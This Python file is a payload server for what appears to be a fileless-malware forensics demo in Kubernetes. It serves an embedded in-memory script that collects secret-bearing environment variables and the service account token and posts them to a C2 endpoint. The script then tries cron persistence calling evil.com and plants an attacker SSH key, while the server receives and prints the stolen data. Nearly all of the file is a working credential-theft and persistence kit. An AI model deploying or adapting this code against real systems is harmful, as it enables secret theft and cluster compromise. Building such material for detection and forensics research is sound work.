#!/usr/bin/env python3
"""
Payload Server - Serves malicious script for fileless execution demo
This simulates a compromised CDN or attacker-controlled server
"""
import os
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# The malicious script that will be downloaded and executed in memory
# This NEVER touches disk on the victim - only lives in memory
MALICIOUS_SCRIPT = '''
# ============================================================================
# FILELESS MALWARE PAYLOAD
# This script is executed entirely in memory - never written to disk
# CRIU checkpoint will capture this script content from process memory
# ============================================================================

import os
import socket
import subprocess
import urllib.request
import json

def log(msg):
    """Log to stderr (will be captured in container logs)"""
    import sys
    print(f"[PAYLOAD] {msg}", file=sys.stderr)

log("=== FILELESS PAYLOAD EXECUTING IN MEMORY ===")
log(f"PID: {os.getpid()}")
log(f"Hostname: {socket.gethostname()}")

# ============================================================================
# STAGE 1: Reconnaissance
# ============================================================================
log("Stage 1: Reconnaissance...")

# Harvest environment variables (contains secrets)
secrets = {}
for key, value in os.environ.items():
    if any(x in key.upper() for x in ['KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'CREDENTIAL', 'AWS', 'STRIPE', 'DATABASE']):
        secrets[key] = value
        log(f"  Found secret: {key}={value[:20]}...")

# Get Kubernetes service account token if available
k8s_token = None
try:
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
        k8s_token = f.read()
        log(f"  Found K8s service account token: {k8s_token[:50]}...")
except:
    log("  No K8s service account token found")

# Get namespace
namespace = "unknown"
try:
    with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
        namespace = f.read().strip()
        log(f"  Namespace: {namespace}")
except:
    pass

# Network reconnaissance
log("  Scanning network...")
try:
    # Get local IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    log(f"  Local IP: {local_ip}")
except:
    local_ip = "unknown"

# ============================================================================
# STAGE 2: Data Exfiltration
# ============================================================================
log("Stage 2: Preparing exfiltration package...")

exfil_data = {
    "timestamp": datetime.now().isoformat() if 'datetime' in dir() else "unknown",
    "hostname": socket.gethostname(),
    "namespace": namespace,
    "local_ip": local_ip,
    "secrets": secrets,
    "k8s_token": k8s_token[:100] if k8s_token else None,
    "user": os.environ.get("USER", "unknown"),
    "pwd": os.getcwd(),
}

log("Attempting exfiltration to C2...")
try:
    # Exfiltrate via HTTP POST
    c2_url = "http://payload-server.malicious-cdn.svc.cluster.local:8080/exfil"
    req = urllib.request.Request(
        c2_url,
        data=json.dumps(exfil_data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    response = urllib.request.urlopen(req, timeout=5)
    log(f"  Exfiltration successful: {response.status}")
except Exception as e:
    log(f"  Exfiltration failed: {e}")

# ============================================================================
# STAGE 3: Persistence attempt (will fail but generates detection events)
# ============================================================================
log("Stage 3: Attempting persistence...")

# Try to write cron (will fail - read-only filesystem)
try:
    with open('/etc/cron.d/backdoor', 'w') as f:
        f.write('* * * * * root curl http://evil.com/beacon\\n')
except Exception as e:
    log(f"  Cron persistence failed (expected): {e}")

# Try to add SSH key (will fail)
try:
    os.makedirs('/root/.ssh', exist_ok=True)
    with open('/root/.ssh/authorized_keys', 'a') as f:
        f.write('\\nssh-rsa AAAAB3Nz... attacker@evil.com\\n')
except Exception as e:
    log(f"  SSH persistence failed (expected): {e}")

# ============================================================================
# STAGE 4: Keep running to maintain memory footprint
# ============================================================================
log("Stage 4: Payload complete - maintaining memory presence...")
log("=== PAYLOAD WILL REMAIN IN MEMORY FOR CRIU CAPTURE ===")

# The script content is now in Python interpreter memory
# CRIU will capture this when the pod is checkpointed
# Forensic analysis will reveal this entire script

import time
while True:
    time.sleep(60)
'''

class PayloadHandler(BaseHTTPRequestHandler):
    """HTTP handler for serving malicious payloads"""

    def log_message(self, format, *args):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f'[{timestamp}] {format%args}')

    def do_GET(self):
        """Serve the malicious script payload"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if self.path == '/payload' or self.path == '/payload.py':
            print(f'[{timestamp}] [DOWNLOAD] Payload requested by {self.client_address[0]}')
            print(f'[{timestamp}] [DOWNLOAD] Serving fileless malware script...')

            # Log this event
            with open('/var/log/payload/downloads.log', 'a') as f:
                f.write(f'{timestamp} - {self.client_address[0]} downloaded payload\n')

            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', len(MALICIOUS_SCRIPT))
            self.end_headers()
            self.wfile.write(MALICIOUS_SCRIPT.encode('utf-8'))

        elif self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """Receive exfiltrated data"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if self.path == '/exfil':
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length).decode('utf-8')

            print(f'[{timestamp}] [EXFIL] Data received from {self.client_address[0]}')
            print(f'[{timestamp}] [EXFIL] Size: {content_length} bytes')

            # Log exfiltration
            log_file = f'/var/log/payload/exfil_{timestamp.replace(" ", "_").replace(":", "-")}.json'
            with open(log_file, 'w') as f:
                f.write(body)

            # Pretty print the stolen data
            try:
                data = json.loads(body)
                print(f'[{timestamp}] [EXFIL] === STOLEN DATA ===')
                for key, value in data.get('secrets', {}).items():
                    print(f'[{timestamp}] [EXFIL]   {key}: {value}')
                print(f'[{timestamp}] [EXFIL] ==================')
            except:
                pass

            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')

        else:
            self.send_response(404)
            self.end_headers()


if __name__ == '__main__':
    # Create log directory
    os.makedirs('/var/log/payload', exist_ok=True)

    print('=' * 50)
    print('PAYLOAD SERVER STARTED')
    print('=' * 50)
    print('Endpoints:')
    print('  GET  /payload - Serves malicious Python script')
    print('  POST /exfil   - Receives exfiltrated data')
    print('  GET  /health  - Health check')
    print('=' * 50)
    print('')

    server = HTTPServer(('0.0.0.0', 8080), PayloadHandler)
    print('[*] Listening on port 8080...')
    server.serve_forever()
